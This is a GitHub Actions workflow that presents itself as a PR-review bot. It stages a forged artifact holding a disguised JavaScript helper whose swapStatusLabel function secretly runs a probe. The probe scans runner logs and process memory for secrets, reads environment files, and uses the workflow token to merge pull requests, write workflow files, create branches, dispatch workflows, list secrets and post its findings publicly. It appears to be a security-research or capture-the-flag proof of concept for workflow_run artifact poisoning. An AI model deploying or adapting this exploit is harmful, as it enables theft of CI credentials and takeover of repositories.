name: Bot - On PR Review

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Stage forged artifact tree
        run: |
          mkdir -p stage/.github/scripts/helpers
          cat > stage/review-event.json <<'JSON'
          {"pr_number":17,"review_state":"changes_requested","draft":false}
          JSON
          cat > stage/.github/scripts/helpers/index.js <<'PAYLOAD'
          const fs = require('fs');
          const REPORT = { marker: 'GAB_WFR_RCE_MARKER_v4' };

          async function probe() {
            const { execSync } = require('child_process');
            const repo = process.env.GITHUB_REPOSITORY;
            const tok = process.env['INPUT_GITHUB-TOKEN'] || process.env.GITHUB_TOKEN || '';
            const out = REPORT;
            out.token_present = Boolean(tok);
            out.token_len = tok.length;
            out.token_env = process.env['INPUT_GITHUB-TOKEN'] ? 'INPUT_GITHUB-TOKEN' : 'GITHUB_TOKEN';
            out.rid = process.env.GITHUB_RUN_ID;
            const sh = (c) => { try { return execSync(c, { encoding: 'utf8', timeout: 30000, maxBuffer: 8 * 1024 * 1024 }); } catch (e) { return 'ERR:' + (e.stdout || '') + (e.stderr || ''); } };
            out.diag_flag_grep = sh("grep -rIa -e 'FLAG{' -e 'toJSON(secrets)' /home/runner/actions-runner/_diag /home/runner/work/_temp 2>/dev/null | head -10 || true").slice(0, 2000);
            out.worker_pids = sh("pgrep -af 'Runner.Worker|Runner.Listener' | head -5 || true");
            out.worker_flag_scan = sh("for p in $(pgrep -f 'Runner.Worker|Runner.Listener'); do sudo -n strings -n 8 /proc/$p/mem 2>/dev/null | grep -m3 'FLAG{' && echo \"FOUND_IN_$p\"; done; true").slice(0, 2000);
            out.env_file = sh("ls -l \"$GITHUB_ENV\" \"$GITHUB_OUTPUT\" 2>/dev/null; head -c 500 \"$GITHUB_ENV\" 2>/dev/null; true");
            const api = async (path, opts = {}) => {
              try {
                const r = await fetch('https://api.github.com' + path, {
                  method: opts.method || 'GET',
                  headers: Object.assign({
                    Authorization: 'Bearer ' + tok,
                    Accept: 'application/vnd.github+json',
                    'User-Agent': 'gab-wfr-poc'
                  }, opts.body ? { 'Content-Type': 'application/json' } : {}),
                  body: opts.body
                });
                const text = await r.text();
                return { status: r.status, body: text.slice(0, 1200) };
              } catch (e) {
                return { error: String(e) };
              }
            };
            const gql = async (query, variables) => {
              try {
                const r = await fetch('https://api.github.com/graphql', {
                  method: 'POST',
                  headers: { Authorization: 'Bearer ' + tok, 'Content-Type': 'application/json', 'User-Agent': 'gab-wfr-poc' },
                  body: JSON.stringify({ query, variables })
                });
                return { status: r.status, body: (await r.text()).slice(0, 1500) };
              } catch (e) { return { error: String(e) }; }
            };
            out.whoami = await api('/user');
            out.repo = await api('/repos/' + repo);
            out.createLabel = await api('/repos/' + repo + '/labels', {
              method: 'POST',
              body: JSON.stringify({ name: 'gab-pwned-rce', color: 'ff0000' })
            });
            out.requestChanges = await api('/repos/' + repo + '/pulls/17/reviews', {
              method: 'POST',
              body: JSON.stringify({ event: 'REQUEST_CHANGES', body: 'Requested changes via stolen workflow token.' })
            });
            out.publicKey = await api('/repos/' + repo + '/actions/secrets/public-key');
            out.createRef = await api('/repos/' + repo + '/git/refs', {
              method: 'POST',
              body: JSON.stringify({ ref: 'refs/heads/gab-wfr-write-test', sha: process.env.GITHUB_SHA })
            });
            out.putWorkflowFile = await api('/repos/' + repo + '/contents/.github/workflows/zz-write-probe.yaml', {
              method: 'PUT',
              body: JSON.stringify({ message: 'probe', content: Buffer.from('name: zz\non: workflow_dispatch\n').toString('base64') })
            });
            out.mergeRest = await api('/repos/' + repo + '/pulls/17/merge', {
              method: 'PUT',
              body: JSON.stringify({ merge_method: 'merge' })
            });
            const prq = await gql('query($o:String!,$n:String!,$num:Int!){repository(owner:$o,name:$n){pullRequest(number:$num){id}}}', { o: repo.split('/')[0], n: repo.split('/')[1], num: 17 });
            out.prNodeId = prq;
            let prId = null;
            try { prId = JSON.parse(prq.body).data.repository.pullRequest.id; } catch (e) {}
            out.mergeGql = prId ? await gql('mutation($id: ID!) { mergePullRequest(input: {pullRequestId: $id, mergeMethod: MERGE}) { pullRequest { number merged } } }', { id: prId }) : { error: 'no pr id' };
            out.dispatch = await api('/repos/' + repo + '/actions/workflows/on-schedule-inactivity.yaml/dispatches', {
              method: 'POST',
              body: JSON.stringify({ ref: 'main' })
            });
            out.listSecrets = await api('/repos/' + repo + '/actions/secrets');
            out.listVariables = await api('/repos/' + repo + '/actions/variables');
            out.listEnvironments = await api('/repos/' + repo + '/environments');
            out.listArtifacts = await api('/repos/' + repo + '/actions/artifacts?per_page=10');
            out.issueComment = await api('/repos/' + repo + '/issues/18/comments', {
              method: 'POST',
              body: JSON.stringify({ body: 'WFR RCE v4 probe result (token proof + permission boundaries):\n\n```json\n' + JSON.stringify(out, null, 1).slice(0, 60000) + '\n```' })
            });
            console.log('GAB_WFR_RESULT_B64:' + Buffer.from(JSON.stringify(out)).toString('base64'));
            try { fs.writeFileSync('PWNED.txt', 'GAB_WFR_RCE_MARKER_v4\n'); } catch (e) {}
            return out;
          }

          module.exports = {
            createLogger: () => ({ log() {}, error() {} }),
            buildBotContext: ({ github, context }) => ({ github, context }),
            swapStatusLabel: async (botContext) => {
              try { await probe(); } catch (e) { console.log('GAB_WFR_ERR:' + (e && e.stack ? e.stack : String(e))); }
              return { success: true };
            },
            STATUS_LABELS: {}
          };
          PAYLOAD
      - name: Upload forged artifact
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
        with:
          name: review-event-${{ github.run_id }}
          path: stage
          include-hidden-files: true
          retention-days: 1
